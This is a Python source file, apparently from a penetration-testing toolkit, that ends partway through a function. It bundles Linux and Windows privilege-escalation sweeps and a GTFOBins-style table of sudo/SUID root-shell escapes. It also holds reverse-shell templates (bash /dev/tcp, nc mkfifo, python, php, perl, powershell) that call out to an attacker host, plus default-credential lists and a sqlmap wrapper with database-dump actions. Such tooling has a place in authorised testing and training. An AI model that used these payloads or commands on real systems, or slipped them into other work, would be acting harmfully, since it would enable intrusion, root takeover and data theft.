# One read-only privesc sweep per platform. Single line each (the exec path forbids
# control chars); everything is bounded with head/-First so the reply stays readable.
_NIX_PRIVESC = (
    "echo '=== whoami ==='; id; "
    "echo '=== sudo ==='; sudo -n -l 2>/dev/null; "
    "echo '=== suid ==='; find / -perm -4000 -type f 2>/dev/null | head -n 40; "
    "echo '=== sgid ==='; find / -perm -2000 -type f 2>/dev/null | head -n 20; "
    "echo '=== caps ==='; getcap -r / 2>/dev/null | head -n 20; "
    "echo '=== cron ==='; cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; "
    "echo '=== writable-services ==='; "
    "find /etc/systemd/ /lib/systemd/ -writable -type f 2>/dev/null | head -n 20; "
    "echo '=== nfs ==='; cat /etc/exports 2>/dev/null; "
    "echo '=== kernel ==='; uname -a; "
    "echo '=== writable-dirs ==='; "
    "find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|run|dev|tmp)' | head -n 20"
)
_WIN_PRIVESC = (
    "whoami; echo '=== priv ==='; whoami /priv; "
    "echo '=== groups ==='; whoami /groups; "
    "echo '=== unquoted-services ==='; Get-CimInstance Win32_Service | Where-Object { "
    "$_.PathName -and $_.PathName -like '* *' -and $_.PathName -notlike '\"*' -and "
    "$_.PathName -notlike 'C:\\Windows*' } | Select-Object Name,PathName -First 20 | Format-List; "
    "echo '=== alwaysinstallelevated ==='; "
    "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>$null; "
    "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>$null; "
    "echo '=== stored-creds ==='; cmdkey /list; "
    "echo '=== hotfixes ==='; Get-HotFix | Select-Object -Last 10 | Format-Table -AutoSize"
)

# Offline GTFOBins-style map: binary -> {function: exploitation command}. Curated to the
# common local-privesc functions (sudo / suid); see gtfobins.github.io for the full set.
_GTFOBINS = {
    "find": {"sudo": "sudo find . -exec /bin/sh \\; -quit",
             "suid": "./find . -exec /bin/sh -p \\; -quit"},
    "vim":  {"sudo": "sudo vim -c ':!/bin/sh'",
             "suid": "./vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'"},
    "vi":   {"sudo": "sudo vi -c ':!/bin/sh'"},
    "nano": {"sudo": "sudo nano  # then ^R^X and enter: reset; sh 1>&0 2>&0"},
    "less": {"sudo": "sudo less /etc/profile  # then type: !/bin/sh"},
    "more": {"sudo": "sudo more /etc/profile  # (small window) then: !/bin/sh"},
    "man":  {"sudo": "sudo man man  # then type: !/bin/sh"},
    "awk":  {"sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
             "suid": "./awk 'BEGIN {system(\"/bin/sh -p\")}'"},
    "gawk": {"sudo": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"},
    "python": {"sudo": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
               "suid": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    "python3": {"sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
                "suid": "./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    "perl": {"sudo": "sudo perl -e 'exec \"/bin/sh\";'",
             "suid": "./perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'"},
    "ruby": {"sudo": "sudo ruby -e 'exec \"/bin/sh\"'"},
    "lua":  {"sudo": "sudo lua -e 'os.execute(\"/bin/sh\")'"},
    "php":  {"sudo": "sudo php -r \"system('/bin/sh');\""},
    "node": {"sudo": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"},
    "bash": {"sudo": "sudo bash", "suid": "./bash -p"},
    "sh":   {"sudo": "sudo sh",   "suid": "./sh -p"},
    "dash": {"suid": "./dash -p"},
    "env":  {"sudo": "sudo env /bin/sh", "suid": "./env /bin/sh -p"},
    "tar":  {"sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 "
                     "--checkpoint-action=exec=/bin/sh"},
    "zip":  {"sudo": "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'"},
    "gdb":  {"sudo": "sudo gdb -nx -ex '!sh' -ex quit",
             "suid": "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"},
    "make": {"sudo": "sudo make -s --eval=$'x:\\n\\t-'\"/bin/sh\""},
    "nmap": {"sudo": "sudo nmap --interactive  # then: !sh   (old nmap only)"},
    "ftp":  {"sudo": "sudo ftp  # then: !/bin/sh"},
    "sed":  {"sudo": "sudo sed -n '1e exec sh 1>&0' /etc/hosts"},
    "ed":   {"sudo": "sudo ed  # then: !/bin/sh"},
    "emacs":{"sudo": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"},
    "socat":{"sudo": "sudo socat stdin exec:/bin/sh"},
    "expect":{"sudo": "sudo expect -c 'spawn /bin/sh;interact'"},
    "xargs":{"sudo": "sudo xargs -a /dev/null sh"},
    "flock":{"sudo": "sudo flock -u / /bin/sh"},
    "strace":{"sudo": "sudo strace -o /dev/null /bin/sh"},
    "gcc":  {"sudo": "sudo gcc -wrapper /bin/sh,-s ."},
    "rsync":{"sudo": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"},
    "git":  {"sudo": "sudo git -p help config  # then: !/bin/sh"},
    "docker":{"sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    "mysql":{"sudo": "sudo mysql -e '\\! /bin/sh'"},
    "journalctl":{"sudo": "sudo journalctl  # (pager) then: !/bin/sh"},
    "cpulimit":{"sudo": "sudo cpulimit -l 100 -f -- /bin/sh -p"},
    "openssl":{"sudo": "# load a malicious engine — see gtfobins.github.io/gtfobins/openssl"},
    "systemctl":{"sudo": "# write a unit with ExecStart=/bin/sh then start it — see GTFOBins"},
    "wget": {"sudo": "sudo wget --use-askpass=/bin/sh 0  # or overwrite a file with -O"},
    "cp":   {"sudo": "# arbitrary write: sudo cp your_file /root/... (overwrite as root)"},
    "tee":  {"sudo": "echo data | sudo tee /path/as/root  # arbitrary write"},
    "dd":   {"sudo": "echo data | sudo dd of=/path/as/root  # arbitrary write"},
    "cat":  {"suid": "./cat /etc/shadow  # arbitrary file READ as owner"},
    "chmod":{"sudo": "sudo chmod 4755 /bin/bash  # then: bash -p"},
    "chown":{"sudo": "sudo chown $(id -un):$(id -gn) /etc/passwd  # then edit it"},
}


def _b_linux_privesc_enum(a):
    """Sweep the classic Linux local-privesc vectors over an authenticated ssh login —
    sudo -l, SUID/SGID, capabilities, cron, writable service files, kernel, NFS exports,
    writable dirs. Read-only, one login."""
    host = _req_host(a)
    return _ssh_run_argv(host, a, _NIX_PRIVESC)


def _b_windows_privesc_enum(a):
    """Sweep the classic Windows local-privesc vectors over an authenticated WinRM login
    — token privileges (SeImpersonate…), groups, unquoted service paths,
    AlwaysInstallElevated, stored creds (cmdkey), hotfix level. Read-only, one login."""
    host = _req_host(a)
    return _winrm_run_argv(host, a, _WIN_PRIVESC)


def _b_gtfobins_lookup(a):
    """Offline GTFOBins lookup: given a binary (found SUID or sudo-allowed), return the
    known local-privesc technique(s). No target contact — a bundled reference."""
    name = os.path.basename(_word(a, "binary").strip()).lower()
    entry = _GTFOBINS.get(name)
    if not entry:
        return (f"'{name}' is not in the bundled GTFOBins set. Check the full list at "
                f"https://gtfobins.github.io/gtfobins/{name}/ (functions like sudo/suid/"
                f"capabilities may still exist there).", False)
    out = [f"GTFOBins — {name}: local privilege-escalation technique(s)"]
    for func in ("sudo", "suid", "capabilities", "shell"):
        if func in entry:
            out.append(f"\n[{func}]\n{entry[func]}")
    for func, cmd in entry.items():                    # any other functions
        if func not in ("sudo", "suid", "capabilities", "shell"):
            out.append(f"\n[{func}]\n{cmd}")
    out.append("\n\nFull reference: https://gtfobins.github.io/gtfobins/" + name + "/")
    return "\n".join(out)


# ── recon batch ───────────────────────────────────────────────────────────────
def _b_subdomain_enum(a):
    domain = _word(a, "domain")
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    return ["subfinder", "-d", domain, "-silent"], "subfinder"


def _b_dns_zone_transfer(a):
    domain = _word(a, "domain")
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    ns = (a.get("nameserver") or "").strip()
    if not ns or not _HOST_RE.match(ns):
        raise ValueError("`nameserver` (an NS host/IP to try) is required")
    return ["dig", "axfr", domain, "@" + ns], "dig"


def _b_traceroute(a):
    host = _req_host(a)
    argv = ["traceroute", "-n"]
    hops = a.get("max_hops")
    if hops is not None:
        try:
            h = int(hops)
        except (TypeError, ValueError):
            raise ValueError("`max_hops` must be a number")
        if not 1 <= h <= 64:
            raise ValueError("`max_hops` must be 1-64")
        argv += ["-m", str(h)]
    proto = (a.get("protocol") or "udp").lower()
    if proto in ("icmp", "tcp") and not _is_root():
        raise ValueError(f"{proto} traceroute needs root — use protocol=udp or run "
                         "as root")
    if proto == "icmp":
        argv.append("-I")
    elif proto == "tcp":
        argv.append("-T")
    elif proto != "udp":
        raise ValueError("`protocol` must be udp/icmp/tcp")
    return argv + [host], "traceroute"


def _b_vhost_fuzz(a):
    url = _req_url(a)
    domain = _word(a, "domain")
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    name = (a.get("wordlist") or "small").lower()
    if name not in _DNS_WORDLISTS:
        raise ValueError("`wordlist` must be small/large/common")
    wl = _resolve_dns_wordlist(name)
    if not wl:
        raise ValueError(f"wordlist '{name}' not found — install seclists")
    return (["ffuf", "-u", url, "-H", f"Host: FUZZ.{domain}", "-w", wl, "-ac", "-s"],
            "ffuf")


# ── python-native tools (no external binary; computed in-process, always available) ──
# These builders RETURN THE RESULT TEXT (str, or (str, is_error)) instead of an argv —
# _call_tool detects that and skips the subprocess. Fast, deterministic, dependency-
# free; they cover logic/lookups that CLI tools do poorly.
_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def _b_hash_identify(a):
    h = _word(a, "hash").strip()
    if re.search(r"\s", h):
        raise ValueError("give one hash at a time")
    guesses, n = [], len(h)
    prefix = {"$2": "bcrypt", "$1$": "md5crypt", "$5$": "sha256crypt",
              "$6$": "sha512crypt", "$y$": "yescrypt", "$7$": "scrypt",
              "{SSHA}": "SSHA (LDAP)", "{SHA}": "SHA1 (LDAP)", "$apr1$": "apache md5",
              "$argon2": "argon2"}
    for p, name in prefix.items():
        if h.startswith(p):
            guesses.append(name)
    if re.fullmatch(r"[0-9a-fA-F]{32}:[0-9a-fA-F]{32}", h):
        guesses.append("LM:NT (NTLM pair)")
    if re.fullmatch(r"\*[0-9A-Fa-f]{40}", h):
        guesses.append("MySQL 4.1+")
    if re.fullmatch(r"[0-9a-fA-F]+", h):
        guesses += {32: ["MD5", "NTLM", "MD4"], 40: ["SHA1"], 56: ["SHA224"],
                    64: ["SHA256"], 96: ["SHA384"], 128: ["SHA512"],
                    16: ["MySQL<4.1", "CRC64"]}.get(n, [])
    guesses = list(dict.fromkeys(guesses)) or ["unknown — check length/charset"]
    return f"length {n}\nlikely: " + ", ".join(guesses)


def _b_jwt_decode(a):
    import base64
    tok = _word(a, "token").strip()
    parts = tok.split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT (need header.payload[.signature])")

    def _seg(s):
        return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    try:
        header = json.loads(_seg(parts[0]))
        payload = json.loads(_seg(parts[1]))
    except Exception as exc:                            # noqa: BLE001
        raise ValueError(f"could not decode JWT: {exc}")
    out = ["header:  " + json.dumps(header), "payload: " + json.dumps(payload)]
    alg = str(header.get("alg", "")).lower()
    notes = []
    if alg in ("none", ""):
        notes.append("⚠ alg:none — signature not verified (auth bypass)")
    if alg.startswith("hs"):
        notes.append("HMAC — crackable offline if the secret is weak")
    if payload.get("exp"):
        import datetime
        notes.append("exp " + datetime.datetime.utcfromtimestamp(
            int(payload["exp"])).isoformat() + "Z")
    if notes:
        out.append("notes:   " + "; ".join(notes))
    return "\n".join(out)


def _b_data_transform(a):
    import base64
    import codecs
    import urllib.parse
    if "data" not in a:
        raise ValueError("`data` is required")
    data = str(a.get("data"))
    action = (a.get("action") or "decode").lower()
    enc = (a.get("encoding") or "base64").lower()
    if action not in ("encode", "decode"):
        raise ValueError("`action` must be encode or decode")
    if enc not in ("base64", "hex", "url", "rot13"):
        raise ValueError("`encoding` must be base64/hex/url/rot13")
    try:
        if action == "encode":
            r = {"base64": lambda: base64.b64encode(data.encode()).decode(),
                 "hex": lambda: data.encode().hex(),
                 "url": lambda: urllib.parse.quote(data),
                 "rot13": lambda: codecs.encode(data, "rot13")}[enc]()
        else:
            r = {"base64": lambda: base64.b64decode(
                    data + "=" * (-len(data) % 4)).decode("utf-8", "replace"),
                 "hex": lambda: bytes.fromhex(data).decode("utf-8", "replace"),
                 "url": lambda: urllib.parse.unquote(data),
                 "rot13": lambda: codecs.decode(data, "rot13")}[enc]()
    except Exception as exc:                            # noqa: BLE001
        raise ValueError(f"transform failed: {exc}")
    return r


def _b_cidr_expand(a):
    import ipaddress
    try:
        net = ipaddress.ip_network(_word(a, "cidr").strip(), strict=False)
    except Exception as exc:                            # noqa: BLE001
        raise ValueError(f"bad cidr: {exc}")
    hosts = list(net.hosts()) if net.num_addresses > 2 else list(net)
    cap = 2048
    lines = [f"{net} — {net.num_addresses} addresses, {len(hosts)} usable hosts"]
    lines += [str(h) for h in hosts[:cap]]
    if len(hosts) > cap:
        lines.append(f"… (+{len(hosts) - cap} more, capped)")
    return "\n".join(lines)


def _b_ip_info(a):
    import ipaddress
    try:
        obj = ipaddress.ip_address(_word(a, "ip").strip())
    except Exception as exc:                            # noqa: BLE001
        raise ValueError(f"bad ip: {exc}")
    flags = [attr[3:] for attr in ("is_private", "is_loopback", "is_link_local",
                                   "is_multicast", "is_reserved", "is_global")
             if getattr(obj, attr)]
    return f"{obj} — IPv{obj.version}; {', '.join(flags) or 'unspecified'}"


_SHELL_TEMPLATES = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "nc_mkfifo": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
                 "nc {lhost} {lport} >/tmp/f",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket();"
              "s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];"
              "subprocess.call([\"/bin/sh\",\"-i\"])'",
    "php": "php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,"
            "getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "powershell": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',"
                  "{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read("
                  "$b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString("
                  "$b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
                  "$sy=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sy,0,$sy.Length);"
                  "$s.Flush()}\"",
}


def _b_payload_gen(a):
    lhost = _word(a, "lhost").strip()
    if not _HOST_RE.match(lhost):
        raise ValueError("`lhost` must be an IP/host")
    try:
        lport = int(a.get("lport"))
    except (TypeError, ValueError):
        raise ValueError("`lport` is required (a port number)")
    if not 1 <= lport <= 65535:
        raise ValueError("`lport` must be 1-65535")
    kind = (a.get("type") or "bash").lower()
    if kind not in _SHELL_TEMPLATES:
        raise ValueError("`type` must be one of " + ", ".join(_SHELL_TEMPLATES))
    payload = _SHELL_TEMPLATES[kind].format(lhost=lhost, lport=lport)
    return (f"# reverse shell — {kind} (generated, NOT executed)\n{payload}\n\n"
            f"# start a listener first:\nnc -lvnp {lport}")


_DEFAULT_CREDS = {
    "tomcat": ["tomcat:tomcat", "admin:admin", "tomcat:s3cret", "role1:role1"],
    "jenkins": ["admin:admin"], "grafana": ["admin:admin"], "jboss": ["admin:admin"],
    "weblogic": ["weblogic:welcome1", "system:password"], "phpmyadmin": ["root:"],
    "mysql": ["root:", "root:root", "root:toor"], "postgres": ["postgres:postgres"],
    "mssql": ["sa:", "sa:sa"], "oracle": ["system:manager", "sys:change_on_install"],
    "rabbitmq": ["guest:guest"], "elasticsearch": ["elastic:changeme"],
    "gitlab": ["root:5iveL!fe"], "router": ["admin:admin", "admin:password"],
    "ssh": ["root:root", "root:toor"], "ftp": ["anonymous:anonymous", "ftp:ftp"],
    "vnc": ["<no-user>:password"], "mongodb": ["<often no auth>"],
    "redis": ["<often no auth>"], "cisco": ["cisco:cisco", "admin:admin"],
    "printer": ["admin:", "admin:admin"], "webmin": ["admin:admin"],
}


def _b_default_creds(a):
    q = _word(a, "product").strip().lower()
    hits = {k: v for k, v in _DEFAULT_CREDS.items() if k in q or q in k}
    if not hits:
        return (f"no bundled default creds for '{q}'. Try the vendor docs or "
                "SecLists/Passwords/Default-Credentials.")
    return "\n".join(f"{k}: " + ", ".join(v) for k, v in hits.items())


def _ver_key(v):
    return tuple(int(x) for x in re.findall(r"\d+", v or ""))


def _b_cve_lookup(a):
    import sqlite3
    vendor = _word(a, "vendor").strip().lower()
    product = _word(a, "product").strip().lower()
    version = _word(a, "version").strip()
    if not re.search(r"\d", version):
        raise ValueError("`version` must contain a number")
    path = os.path.join(_ROOT, "appdata", "cve_index.db")
    if not os.path.exists(path):
        return ("[no index] appdata/cve_index.db is not present (built by the "
                "installer from NVD).", True)
    try:
        con = sqlite3.connect(path)
        rows = con.execute(
            "SELECT m.exact_ver, m.vsi, m.vse, m.vei, m.vee, m.cve FROM cve_match m "
            "JOIN product p ON p.id = m.product_id WHERE p.vendor=? AND p.product=?",
            (vendor, product)).fetchall()
        con.close()
    except sqlite3.Error as exc:
        return (f"index query failed: {exc}", True)
    vk = _ver_key(version)
    matched = set()
    for exact, vsi, vse, vei, vee, cve in rows:
        if exact:
            ek = _ver_key(exact)
            if len(vk) >= len(ek) and vk[:len(ek)] == ek:
                matched.add(cve)
        elif len(vk) >= 2 and (vsi or vse) and (vei or vee):   # closed range only
            def _ge(b):
                return not b or vk >= _ver_key(b)

            def _le(b):
                return not b or vk <= _ver_key(b)
            if _ge(vsi) and _le(vei) and (not vse or vk > _ver_key(vse)) \
                    and (not vee or vk < _ver_key(vee)):
                matched.add(cve)
    if not matched:
        return f"{product} {version}: no CVEs matched the index (strict version match)."
    kev = set()
    try:
        with open(os.path.join(_ROOT, "appdata", "kev.txt"), encoding="utf-8") as fh:
            kev = {ln.strip() for ln in fh if ln.startswith("CVE-")}
    except OSError:
        pass
    order = sorted(matched, key=lambda c: tuple(-int(x) for x in re.findall(r"\d+", c)))
    k = [c for c in order if c in kev]
    o = [c for c in order if c not in kev]
    out = [f"{product} {version} — {len(k)} KEV (known-exploited), {len(o)} other"]
    if k:
        out.append("KEV: " + ", ".join(k[:20]))
    if o:
        out.append("other: " + ", ".join(o[:20]) + (" …" if len(o) > 20 else ""))
    return "\n".join(out)


def _b_tls_analyze(a):
    import socket
    import ssl
    host, port = _req_host(a), _port(a, 443)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ss:
                ver, cipher = ss.version(), ss.cipher()
    except Exception as exc:                            # noqa: BLE001
        return (f"TLS connect to {host}:{port} failed: {exc}", True)
    note = ""
    if ver in ("SSLv3", "TLSv1", "TLSv1.1"):
        note = "  ⚠ obsolete protocol"
    return (f"{host}:{port}\nprotocol: {ver}{note}\ncipher: {cipher[0]} "
            f"({cipher[2]} bits)")


def _b_robots_sitemap(a):
    import ssl
    import urllib.request
    base = _req_url(a).rstrip("/")
    unverified = ssl._create_unverified_context()
    out = []
    for path in ("/robots.txt", "/sitemap.xml"):
        try:
            req = urllib.request.Request(base + path,
                                         headers={"User-Agent": "Mozilla/5.0"})
            body = urllib.request.urlopen(req, timeout=15,
                                          context=unverified).read(20000)
            out.append(f"== {path} ==\n" + body.decode("utf-8", "replace").strip())
        except Exception as exc:                        # noqa: BLE001
            out.append(f"== {path} == (not available: {exc})")
    return "\n\n".join(out)


# ── batch 5: more CLI tools ───────────────────────────────────────────────────
def _b_sqlmap(a):
    url = _req_url(a)
    argv = ["sqlmap", "-u", url, "--batch", "--disable-coloring"]
    data = (a.get("data") or "").strip()
    if data:
        argv += ["--data", _no_ctrl(data, "data")]
    cookie = (a.get("cookie") or "").strip()
    if cookie:
        argv += ["--cookie", _no_ctrl(cookie, "cookie")]
    param = (a.get("param") or "").strip()
    if param:
        if not re.match(r"^[A-Za-z0-9_\[\]]+$", param):
            raise ValueError("`param` has invalid characters")
        argv += ["-p", param]
    for key, flag, lo, hi in (("level", "--level", 1, 5), ("risk", "--risk", 1, 3)):
        if a.get(key) is not None:
            try:
                n = int(a[key])
            except (TypeError, ValueError):
                raise ValueError(f"`{key}` must be a number")
            if not lo <= n <= hi:
                raise ValueError(f"`{key}` must be {lo}-{hi}")
            argv += [flag, str(n)]
    action = (a.get("action") or "test").lower()
    if action == "dbs":
        argv.append("--dbs")
    elif action == "current":
        argv += ["--current-db", "--current-user", "--hostname"]
    elif action == "dump":
        db = (a.get("database") or "").strip()
        if not re.match(r"^[A-Za-z0-9_.$-]+$", db or ""):
            raise ValueError("action=dump needs a valid `database`")
        argv += ["-D", db, "--dump"]
        tbl = (a.get("table") or "").strip()
        if tbl:
            if not re.match(r"^[A-Za-z0-9_.$-]+$", tbl):
                raise ValueError("`table` has invalid characters")
            argv += ["-T", tbl]
    elif action != "test":
        raise ValueError("`action` must be test/dbs/current/dump")
    return argv, "sqlmap"


def _b_wpscan(a):
    url = _req_url(a)
    argv = ["wpscan", "--url", url, "--no-banner", "--disable-tls-checks",
            "--random-user-agent", "-f", "cli-no-color"]
    enum = (a.get("enumerate") or "vp,vt,u").strip()
    if enum:
        if not re.match(r"^[a-z0-9,]+$", enum):
            raise ValueError("`enumerate` has invalid characters")
        argv += ["--enumerate", enum]
    token = (a.get("api_token") or "").strip()
    if token:
        if not re.match(r"^[A-Za-z0-9]+$", token):
            raise ValueError("`api_token` has invalid characters")
        argv += ["--api-token", token]
    return argv, "wpscan"


def _b_enum4linux(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    argv = ["enum4linux-ng", "-A", host]
    if user:
        argv += ["-u", user, "-p", password]
    if domain:
        argv += ["-d", domain]
    return argv, "enum4linux-ng"


def _b_smbmap(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    argv = ["smbmap", "-H", host, "-u", user, "-p", (nthash or password)]
    if domain:
        argv += ["-d", domain]
    share = (a.get("share") or "").strip()
    if share:
        if not re.match(r"^[A-Za-z0-9._$ -]+$", share):
            raise ValueError("`share` has invalid characters")
        argv += ["-s", share]
    if a.get("recurse"):
        argv.append("-R")
    return argv, "smbmap"


def _b_certipy(a):
    dc = (a.get("dc") or a.get("host") or "").strip()
    if not dc or "/" in dc or not _HOST_RE.match(dc):
        raise ValueError("`dc` (domain controller host/IP) is required")
    domain = (a.get("domain") or "").strip()
    if not domain or not re.match(r"^[A-Za-z0-9._-]+$", domain):
        raise ValueError("`domain` is required (e.g. corp.local)")
    user, password, nthash, _d = _creds(a, require=True)
    argv = ["certipy", "find", "-u", f"{user}@{domain}", "-dc-ip", dc,
            "-stdout", "-vulnerable"]
    if nthash:
        argv += ["-hashes", _hashes_arg(nthash)]
    else:
        argv += ["-p", password]
    return argv, "certipy"


def _b_testssl(a):
    host, port = _req_host(a), _port(a, 443)
    return ["testssl", "--color", "0", "--quiet", f"{host}:{port}"], "testssl"


def _b_ssh_audit(a):
    host, port = _req_host(a), _port(a, 22)
    return ["ssh-audit", "-n", "-p", str(port), host], "ssh-audit"


def _b_smtp_user_enum(a):
    host, port = _req_host(a), _port(a, 25)
    user = _word(a, "username").strip()
    if not re.match(r"^[A-Za-z0-9._@-]+$", user):
        raise ValueError("`username` has invalid characters")
    method = (a.get("method") or "VRFY").upper()
    if method not in ("VRFY", "EXPN", "RCPT"):
        raise ValueError("`method` must be VRFY/EXPN/RCPT")
    return (["smtp-user-enum", "-M", method, "-u", user, "-t", host, "-p", str(port)],
            "smtp-user-enum")


def _b_wafw00f(a):
    return ["wafw00f", _req_url(a), "-a"], "wafw00f"


# ── batch 6: python-native web/recon utilities (no external binary) ───────────
def _http_get(url, timeout=15, method="GET", headers=None):
    import ssl
    import urllib.request
    h = {"User-Agent": "Mozilla/5.0"}
    h.update(headers or {})
    req = urllib.request.Request(url, headers=h, method=method)
    ctx = ssl._create_unverified_context()
    return urllib.request.urlopen(req, timeout=timeout, context=ctx)


def _b_git_dump(a):
    base = _req_url(a).rstrip("/")
    out, exposed = [], False
    for path in ("/.git/HEAD", "/.git/config", "/.git/description", "/.git/logs/HEAD"):
        try:
            body = _http_get(base + path).read(3000).decode("utf-8", "replace").strip()
            if path.endswith("HEAD") and body.startswith("ref:"):
                exposed = True
            out.append(f"== {path} ==\n{body[:800]}")
        except Exception:                              # noqa: BLE001
            out.append(f"== {path} == (not available)")
    head = ("⚠ .git is EXPOSED — source and secrets may be recoverable "
            "(use git-dumper to reconstruct the repo).\n\n" if exposed else
            "no exposed .git detected (HEAD is not a valid git ref).\n\n")
    return head + "\n\n".join(out)


def _b_s3_check(a):
    import urllib.error
    bucket = (a.get("bucket") or "").strip()
    url = (a.get("url") or "").strip()
    if url:
        target = url if _URL_RE.match(url) else None
        if not target:
            raise ValueError("`url` must be an http(s) URL")
    elif bucket:
        if not re.match(r"^[A-Za-z0-9._-]+$", bucket):
            raise ValueError("`bucket` has invalid characters")
        target = f"https://{bucket}.s3.amazonaws.com/"
    else:
        raise ValueError("provide `bucket` or `url`")
    try:
        body = _http_get(target).read(3000).decode("utf-8", "replace")
        code = 200
    except urllib.error.HTTPError as exc:
        code, body = exc.code, exc.read(1500).decode("utf-8", "replace")
    except Exception as exc:                            # noqa: BLE001
        return (f"request failed: {exc}", True)
    if code == 200 and "ListBucketResult" in body:
        keys = re.findall(r"<Key>([^<]+)</Key>", body)
        return (f"{target}\nPUBLIC + LISTABLE ({len(keys)} objects). "
                f"First: {', '.join(keys[:10])}")
    if code == 403:
        return f"{target}\nexists but access denied (403) — private."
    if code == 404:
        return f"{target}\nno such bucket (404)."
    return f"{target}\nHTTP {code}\n{body[:400]}"


_SEC_HEADERS = {"content-security-policy": "CSP",
                "strict-transport-security": "HSTS",
                "x-frame-options": "X-Frame-Options",
                "x-content-type-options": "X-Content-Type-Options",
                "referrer-policy": "Referrer-Policy",
                "permissions-policy": "Permissions-Policy"}


def _b_security_headers(a):
    url = _req_url(a)
    try:
        hdrs = {k.lower(): v for k, v in _http_get(url).getheaders()}
    except Exception as exc:                            # noqa: BLE001
        return (f"request failed: {exc}", True)
    present = [lab for h, lab in _SEC_HEADERS.items() if h in hdrs]
    missing = [lab for h, lab in _SEC_HEADERS.items() if h not in hdrs]
    out = [f"present: {', '.join(present) or 'none'}",
           f"missing: {', '.join(missing) or 'none'}"]
    leak = [f"{h}: {hdrs[h]}" for h in ("server", "x-powered-by") if h in hdrs]
    if leak:
        out.append("tech: " + "; ".join(leak))
    return "\n".join(out)


def _b_cookie_analyze(a):
    url = _req_url(a)
    try:
        cookies = _http_get(url).headers.get_all("Set-Cookie") or []
    except Exception as exc:                            # noqa: BLE001
        return (f"request failed: {exc}", True)
    if not cookies:
        return "no cookies set."
    out = []
    for c in cookies:
        name, low = c.split("=", 1)[0], c.lower()
        flags = [f if f in low else f"NO-{f}" for f in ("secure", "httponly")]
        flags.append("samesite" if "samesite" in low else "NO-samesite")
        out.append(f"{name}: {', '.join(flags)}")
    return "\n".join(out)


def _mmh3_32(data, seed=0):
    """MurmurHash3 x86 32-bit (signed), matching Python's mmh3.hash — for Shodan-style
    http.favicon.hash pivots."""
    c1, c2 = 0xcc9e2d51, 0x1b873593
    length, h1 = len(data), seed & 0xffffffff
    rounded = (length // 4) * 4
    for i in range(0, rounded, 4):
        k1 = data[i] | (data[i + 1] << 8) | (data[i + 2] << 16) | (data[i + 3] << 24)
        k1 = (k1 * c1) & 0xffffffff
        k1 = ((k1 << 15) | (k1 >> 17)) & 0xffffffff
        h1 ^= (k1 * c2) & 0xffffffff
        h1 = ((h1 << 13) | (h1 >> 19)) & 0xffffffff
        h1 = (h1 * 5 + 0xe6546b64) & 0xffffffff
    k1, tail = 0, length & 3
    if tail >= 3:
        k1 ^= data[rounded + 2] << 16
    if tail >= 2:
        k1 ^= data[rounded + 1] << 8
    if tail >= 1:
        k1 ^= data[rounded]
        k1 = (k1 * c1) & 0xffffffff
        k1 = ((k1 << 15) | (k1 >> 17)) & 0xffffffff
        h1 ^= (k1 * c2) & 0xffffffff
    h1 ^= length
    h1 ^= h1 >> 16
    h1 = (h1 * 0x85ebca6b) & 0xffffffff
    h1 ^= h1 >> 13
    h1 = (h1 * 0xc2b2ae35) & 0xffffffff
    h1 ^= h1 >> 16
    return h1 - 0x100000000 if h1 & 0x80000000 else h1


def _b_favicon_hash(a):
    import base64
    url = _req_url(a).rstrip("/")
    fav = url if url.endswith(".ico") or "favicon" in url else url + "/favicon.ico"
    try:
        content = _http_get(fav).read(200000)
    except Exception as exc:                            # noqa: BLE001
